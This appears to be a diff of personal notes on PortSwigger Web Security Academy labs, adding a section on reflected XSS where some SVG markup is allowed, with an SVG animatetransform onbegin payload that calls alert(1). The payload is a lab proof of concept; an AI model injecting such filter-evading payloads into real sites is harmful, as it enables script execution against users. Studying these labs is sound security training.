@@ -91,10 +91,13 @@ location = 'https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?s
 </script>
 ```
 
+# Reflected XSS with some SVG markup allowed
 
+![[Pasted image 20240807114732.png]]
 
-
-
+```js
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
 
 
 
